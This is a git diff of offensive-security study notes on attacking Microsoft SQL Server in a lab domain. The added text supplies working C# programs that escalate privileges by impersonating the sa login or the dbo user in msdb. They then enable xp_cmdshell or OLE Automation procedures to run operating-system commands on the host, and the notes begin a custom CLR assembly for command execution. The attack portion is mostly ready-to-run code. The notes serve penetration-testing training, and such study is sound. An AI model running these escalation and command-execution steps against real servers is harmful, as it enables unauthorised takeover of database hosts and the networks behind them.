@@ -5206,13 +5206,11 @@ namespace SQL
 
 E.g., Discover that the sa login does allow impersonation.
 
-Let's try to impersonate the sa login.
+Try to impersonate the sa login.
 
 ```csharp
 using System;
 using System.Data.SqlClient;
-using System.Collections.Generic;
-using System.Linq;
 
 namespace SQL
 {
@@ -5245,36 +5243,272 @@ namespace SQL
             Console.WriteLine("Executing in the context of: " + reader[0]);
             reader.Close();
 
-            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
-            command = new SqlCommand(query, con);
+            String executeas = "EXECUTE AS LOGIN = 'sa';";
+            command = new SqlCommand(executeas, con);
             reader = command.ExecuteReader();
+            reader.Close();
 
-            List<String> impersonatablelogins = new List<String>();
-            
-            while (reader.Read() == true)
-            {
-                impersonatablelogins.Add(reader[0].ToString());
-            }
+            Console.WriteLine("After impersonation");
+            querylogin = "SELECT SYSTEM_USER;";
+            command = new SqlCommand(querylogin, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing in the context of: " + reader[0]);
             reader.Close();
             
-            if (!impersonatablelogins.Any())
-                Console.WriteLine("There is no login that can be impersonated");
-            else
-            {
-                Console.WriteLine("After impersonation");
-                foreach (String impersonatablelogin in impersonatablelogins)
-                {
-                    String executeas = "EXECUTE AS LOGIN = '" + impersonatablelogin + "';";
-                    command = new SqlCommand(executeas, con);
-                    reader = command.ExecuteReader();
-                    Console.WriteLine("Executing in the context of: " + impersonatablelogin);
-                    reader.Close();
-                }
-            }
             con.Close();
         }
     }
 }
+```
+
+Our unprivileged login can impersonate the sa login.
+
+=> give us database server administrative privileges.
+
+### Impersonation at the user level
+
+2 prerequisites to this type of privilege escalation:
+
+1. Impersonation must have been granted to our user for a different user that has **additional role memberships**, preferably the **sysadmin** role. A database user can only perform actions on a given database. => Impersonation of a user with sysadmin role membership in a database does not necessarily lead to server-wide sysadmin role membership.
+
+2. To fully compromise the database server, the database user we impersonate must be in a database that has the **TRUSTWORTHY** property set.
+
+The only native database with the TRUSTWORTHY property enabled is **msdb**.
+
+The database owner (**dbo**) user has the **sysadmin** role.
+
+E.g., The **guest** user has been given permissions to impersonate **dbo** in **msdb**.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            Console.WriteLine("Before impersonation");
+            String querylogin = "SELECT USER_NAME();";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing in the context of: " + reader[0]);
+            reader.Close();
+
+            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
+
+            command = new SqlCommand(executeas, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            Console.WriteLine("After impersonation");
+            querylogin = "SELECT USER_NAME();";
+            command = new SqlCommand(querylogin, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing in the context of: " + reader[0]);
+            reader.Close();
+            
+            con.Close();
+        }
+    }
+}
+```
+
+## Getting Code Execution
+
+With sysadmin role membership, it's possible to obtain code execution on the Windows server hosting the SQL database by using the
+
+1. **xp_cmdshell** stored procedure.
+
+2. **sp_OACreate** stored procedure.
+
+## 
+
+**xp_cmdshell** has been disabled by default since Microsoft SQL 2005.
+
+**sysadmin** role membership allows us to enable xp_cmdshell using advanced options and the **sp_configure** stored procedure.
+
+1. Begin with the impersonation of the sa login.
+
+2. Use the sp_configure stored procedure to activate the advanced options
+
+3. Enable xp_cmdshell.
+
+Remember to update the currently configured values with the **RECONFIGURE** statement.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
+            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+            String execCmd = "EXEC xp_cmdshell whoami";
+
+            SqlCommand command = new SqlCommand(impersonateUser, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(enable_xpcmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Result of command is: " + reader[0]);
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+Uses the sp_OACreate and sp_OAMethod stored procedures to create and execute a new stored procedure based on Object Linking and Embedding (OLE).
+
+With this technique, we can instantiate the Windows Script Host and use the run method.
+
+sp_OACreate procedure takes 2 arguments.
+
+1. The OLE object that we want to instantiate (e.g., `wscript.shell`), followed by the local variable where we want to store it.
+
+2.  The local variable is created with the **DECLARE** statement, which accepts its name and type. E.g.  @myshell.
+
+```
+DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
+```
+
+Because @myshell is a local variable, we must stack the SQL queries to ensure it exists when sp_OACreate is invoked.
+
+Execute the newly-created stored procedure with the **sp_OAMethod** procedure.
+
+sp_OAMethod accepts the name of the procedure to execute (@myshell), the method of the OLE object (run), an optional output variable, and any parameters for the invoked method. => send the command we want to execute as a parameter.
+
+It is not possible to obtain the results from the executed command because of the local scope of the @myshell variable.
+
+Ensure that the "OLE Automation Procedures" setting is enabled. Although it is disabled by default, we can change this setting using the sp_configure procedure.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+        
+            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
+            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";
+
+            SqlCommand command = new SqlCommand(impersonateUser, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(enable_ole, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+Recall that due to the local scope of @myshell, we must use stacked queries inside the execCmd variable.
+
+Launch a command prompt as the admin domain user. TVerify that the `C:\Tools\file.txt` file was created on dc01.
+
+```bat
+type \\dc01\c$\tools\file.txt
+```
+
+## Custom Assemblies
+
+If a database has the TRUSTWORTHY property set, it's possible to use the **CREATE ASSEMBLY** statement to import a managed DLL as an object inside the SQL server and execute methods within it.
+
+Create a managed DLL by creating a new "Class Library (.NET Framework)" project.
+
+```csharp
+using System;
+using Microsoft.SqlServer.Server;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+
+public class StoredProcedures
+{
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void cmdExec (SqlString execCommand)
+    {
+      // TODO
+    }
+};
 ```
 
 # Active Directory Exploitation
